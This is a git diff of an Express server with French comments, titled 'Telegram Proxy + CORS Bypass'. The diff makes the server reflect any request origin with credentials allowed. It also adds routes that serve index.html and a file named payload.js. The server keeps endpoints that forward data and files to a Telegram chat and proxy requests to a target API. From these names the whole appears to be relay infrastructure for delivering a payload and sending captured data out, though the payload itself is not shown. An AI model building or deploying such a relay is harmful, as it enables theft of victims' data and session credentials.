@@ -27,7 +27,11 @@ function log(message, type = 'INFO') {
 
 // ==================== MIDDLEWARES ====================
 app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
+    const origin = req.headers.origin;
+    if (origin) {
+        res.header('Access-Control-Allow-Origin', origin);
+        res.header('Access-Control-Allow-Credentials', 'true');
+    }
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Cookie');
     if (req.method === 'OPTIONS') {
@@ -58,6 +62,25 @@ function rateLimitMiddleware(req, res, next) {
     }
     next();
 }
+
+// ==================== SERVEUR STATIQUE (index.html et payload.js) ====================
+app.get('/', (req, res) => {
+    const indexPath = path.join(__dirname, 'index.html');
+    if (fs.existsSync(indexPath)) {
+        res.sendFile(indexPath);
+    } else {
+        res.status(404).json({ error: 'index.html not found' });
+    }
+});
+
+app.get('/payload.js', (req, res) => {
+    const payloadPath = path.join(__dirname, 'payload.js');
+    if (fs.existsSync(payloadPath)) {
+        res.sendFile(payloadPath);
+    } else {
+        res.status(404).json({ error: 'payload.js not found' });
+    }
+});
 
 // ==================== PROXY VERS L'API CIBLE (contourne CORS) ====================
 app.all('/api/*', rateLimitMiddleware, async (req, res) => {
@@ -195,15 +218,17 @@ app.get('/health', (req, res) => {
         chat_configured: !!CHAT_ID,
         uptime: process.uptime(),
         memory: process.memoryUsage(),
-        version: '3.0.0'
+        version: '3.1.0'
     });
 });
 
 app.get('/info', (req, res) => {
     res.json({
-        name: 'Telegram Proxy + CORS Bypass',
-        version: '3.0.0',
+        name: 'Telegram Proxy + CORS Bypass + Static Server',
+        version: '3.1.0',
         endpoints: [
+            'GET / - sert index.html',
+            'GET /payload.js - sert payload.js',
             'GET /health', 'GET /info',
             'POST /send', 'POST /send-file',
             'GET|POST|PUT|DELETE /api/* (proxy vers cible)'
@@ -228,11 +253,11 @@ process.on('unhandledRejection', (reason) => {
 app.listen(PORT, () => {
     log(`========================================`, 'INFO');
     log(`🚀 Proxy actif sur le port ${PORT}`, 'INFO');
+    log(`🌐 Page web: http://localhost:${PORT}/`, 'INFO');
     log(`📊 Health: http://localhost:${PORT}/health`, 'INFO');
     log(`📡 Send: POST http://localhost:${PORT}/send`, 'INFO');
     log(`📁 Send-file: POST http://localhost:${PORT}/send-file`, 'INFO');
-    log(`🔄 Proxy API: https://meta-downloader-79f2.onrender.com/api/*`, 'INFO');
-    log(`🎯 Cible: ${TARGET_API}`, 'INFO');
+    log(`🔄 Proxy API: /api/* -> ${TARGET_API}`, 'INFO');
     log(`🛡️ Rate limit: ${MAX_REQUESTS}/minute`, 'INFO');
     log(`========================================`, 'INFO');
 });
